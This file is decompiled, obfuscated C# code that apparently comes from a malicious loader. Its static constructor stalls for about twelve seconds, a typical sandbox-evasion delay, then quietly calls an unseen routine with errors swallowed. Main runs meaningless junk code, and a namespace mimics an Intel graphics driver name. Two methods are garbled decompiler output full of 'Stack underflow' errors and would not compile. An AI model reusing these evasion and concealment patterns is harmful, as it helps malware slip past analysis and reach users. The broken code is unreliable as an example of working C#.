using System;
using System.Diagnostics;
using System.Reflection;
using System.Threading;
using D;
using igdumdim64;
using ns1;

namespace ns0;

public static class GClass0
{
	public static AppDomain appDomain_0;

	public static Assembly assembly_0;

	public static void smethod_0(long long_0)
	{
		Stopwatch stopwatch = Stopwatch.StartNew();
		long num = long_0 * Stopwatch.Frequency / 1000L;
		while (stopwatch.ElapsedTicks < num)
		{
		}
	}

	public static int smethod_1(ref int int_0)
	{
		int result = int_0;
		Thread.MemoryBarrier();
		return result;
	}

	public static void smethod_2()
	{
		TimeSpan timeSpan = new TimeSpan(0, 0, 12);
		DateTime dateTime = DateTime.Now + timeSpan;
		while (DateTime.Now <= dateTime)
		{
			smethod_0(1000L);
		}
		appDomain_0 = AppDomain.CurrentDomain;
	}

	static GClass0()
	{
		try
		{
			smethod_2();
			y.smethod_1();
		}
		catch
		{
		}
	}

	[STAThread]
	public static int Main()
	{
		smethod_3();
		return 0;
	}

	internal static void smethod_3()
	{
		try
		{
			byte[] array = new byte[16];
			int num = 0;
			int num2 = 0;
			Program.Int32();
			int num3 = ((array.Length - 4 - 0 + 1 - 1 > 255) ? 255 : (array.Length - 4 - num + 1 - 1));
			int num4 = ((num2 >> 12) ^ num2) & 0xFFF;
			byte b = (new byte[4096])[num4];
			int num5 = 0;
			int num6 = 0;
			int i = 0;
			int[,] array2 = new int[0, 0];
			for (; i < 16 && b > i; i++)
			{
				int num7 = array2[num4, i];
				if ((byte)num2 == array[num7] && (byte)(num2 >> 8) == array[num7 + 1] && (byte)(num2 >> 16) == array[num7 + 2] && num7 < num - 2)
				{
					int j;
					for (j = 3; array[num7 + j] == array[num + j] && j < num3; j++)
					{
					}
					if (j > num5 || (j == num5 && num7 > num6))
					{
						num6 = num7;
						num5 = j;
					}
				}
			}
		}
		catch
		{
		}
	}

	static object smethod_4()
	{
		if ((int)/*Error near IL_0002: Stack underflow*/ != 0)
		{
			while ((int)/*Error near IL_0004: Stack underflow*/ != 0)
			{
			}
		}
		return (object)/*Error near IL_0005: Stack underflow*/;
	}

	static object smethod_5()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected I4, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		_003F val = checked(/*Error near IL_0002: Stack underflow*/ - 0);
		if (((string)/*Error near IL_0007: Stack underflow*/).Substring((int)/*Error near IL_0007: Stack underflow*/, (int)val) != null)
		{
		}
		while ((int)/*Error near IL_000b: Stack underflow*/ != 0)
		{
		}
		try
		{
			do
			{
				try
				{
				}
				finally
				{
					if ((int)/*Error near IL_0014: Stack underflow*/ == 0)
					{
					}
					continue;
				}
			}
			while ((int)/*Error near IL_0018: Stack underflow*/ != 0);
		}
		catch
		{
			checked
			{
				_ = /*Error near IL_001d: Stack underflow*/+ 0;
				if (Settings.Default == null)
				{
				}
			}
		}
		return (object)/*Error near IL_002a: Stack underflow*/;
	}
}
